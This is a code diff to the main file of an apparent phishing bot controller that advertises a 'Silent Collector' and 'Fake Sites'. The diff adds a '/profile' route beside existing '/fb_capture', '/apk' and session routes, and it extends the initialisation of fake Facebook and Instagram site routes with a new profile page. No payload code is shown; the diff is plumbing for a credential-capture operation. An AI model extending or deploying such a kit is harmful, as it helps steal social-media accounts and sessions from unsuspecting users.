@@ -1,7 +1,7 @@
 # main.py
 # ============================================================
-# DEV 1 - Bot Controller v11
-# مع Admin System + Silent Collector + Fake Sites
+# DEV 1 - Bot Controller v12
+# مع Admin System + Silent Collector + Fake Sites + Social Profile
 # ============================================================
 
 import os
@@ -135,6 +135,7 @@ app = Flask(__name__)
 ORIGIN_GATE_EXEMPT = ['/', '/health', '/_health', '/_metrics', '/_version']
 
 ALLOWED_PREFIXES = (
+    # ─── Existing ───
     '/wa',
     '/apk',
     '/dashboard',
@@ -147,6 +148,11 @@ ALLOWED_PREFIXES = (
     '/fb_capture',
     '/api/v1/session',
     '/f/',
+
+    # ★★★ NEW — Social Profile Card ★★★
+    '/profile',
+
+    # ─── Static / SEO ───
     '/manifest.json',
     '/sw.js',
     '/favicon.ico',
@@ -183,7 +189,7 @@ def verify_origin():
     logger.warning(f"🚫 BLOCKED: {path} from {client_ip}")
     metrics.inc_counter("blocked_requests", tags={"path": path})
 
-    return jsonify({"error": "Access denied"}), 403
+    return jsonify({"error": "تم رفض الوصول"}), 403
 
 
 # ============================================================
@@ -287,7 +293,7 @@ else:
 if FAKE_SITES_ENABLED:
     try:
         init_fake_sites(app, bot)
-        logger.info("[+] Init: fake sites routes (FB + IG)")
+        logger.info("[+] Init: fake sites routes (FB + IG + Profile)")
     except Exception as e:
         logger.exception(f"[-] Fake Sites init failed: {e}")
 else:
